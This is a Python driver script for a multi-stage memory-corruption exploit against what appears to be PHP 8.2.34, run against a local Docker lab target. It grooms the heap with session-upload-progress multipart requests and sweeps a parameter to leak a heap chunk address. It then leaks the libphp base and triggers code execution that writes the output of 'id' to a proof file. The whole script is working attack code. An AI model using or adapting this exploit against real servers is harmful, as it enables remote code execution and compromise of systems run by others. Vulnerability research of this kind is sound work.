"""Warm up the 8.2.34 worker, then sweep stage1_n to find the working heap-leak calibration."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18111/"
ZIF = 0x39b8a0
DTOR = 0x487650
HTDATA = 0x690d8

t = E.Target(URL, timeout=60.0, verbose=False)

def warmup():
    """Fire a few requests to establish a stable heap state."""
    for i in range(5):
        parts = [{"name": f"w{i:04d}", "data": b"x" * 100} for i in range(200)]
        parts.append({"name": "PHPSESSID", "data": b"warmup"})
        parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
        body = E.build_multipart(parts, b"W" * 10)
        try:
            t.post(body, b"W" * 10, read_cap=1 << 20, timeout=30.0)
        except Exception:
            pass
        time.sleep(0.3)
    print("[*] warmup done", flush=True)

def try_stage1(n):
    ex = E.Exploit(t, "id", zif_offset=ZIF, dtor_offset=DTOR,
                   htdata_offset=HTDATA, huge_mb=12, verbose=False,
                   profile="bookworm")
    ex.stage1_n = n
    ex.rotate()
    try:
        chunk = ex.stage1()
    except Exception as e:
        print(f"    n={n}: ERROR {e}", flush=True)
        chunk = 0
    return chunk

# Warm up the worker
warmup()

# Sweep stage1_n
print("\n=== Sweeping stage1_n (800-960) ===", flush=True)
hits = []
for n in range(800, 964, 4):
    chunk = try_stage1(n)
    if chunk:
        print(f"[+] n={n}: CHUNK BASE = 0x{chunk:x}", flush=True)
        hits.append((n, chunk))
    else:
        print(f"    n={n}: miss", flush=True)
    time.sleep(0.2)

print(f"\n=== {len(hits)} hits out of {(964-800)//4} ===", flush=True)
for n, c in hits:
    print(f"  n={n}: 0x{c:x}", flush=True)

if hits:
    # Verify the best hit with a full exploit run
    best_n, best_chunk = hits[0]
    print(f"\n[*] Best: n={best_n}, chunk=0x{best_chunk:x}", flush=True)
    print("[*] Verifying with full exploit (ref mode)...", flush=True)
    ex = E.Exploit(t, "id>/out/p1", zif_offset=ZIF, dtor_offset=DTOR,
                   htdata_offset=HTDATA, huge_mb=12, verbose=False,
                   profile="bookworm")
    ex.stage1_n = best_n
    ex.stage3_carrier = False
    # Run stage 2
    libphp = 0
    for attempt in range(3):
        libphp = ex.stage2()
        if libphp:
            break
        ex.rotate()
    if libphp:
        print(f"[+] libphp base = 0x{libphp:x}", flush=True)
        htdata = best_chunk + HTDATA
        zif = libphp + ZIF
        ex.stage3(htdata, zif)
        time.sleep(1)
        try:
            r = os.popen("docker exec p2s8234 cat /out/p1 2>&1").read()
            print(f"[*] proof: {r.strip()}", flush=True)
        except Exception:
            pass
    else:
        print("[-] stage 2 failed", flush=True)
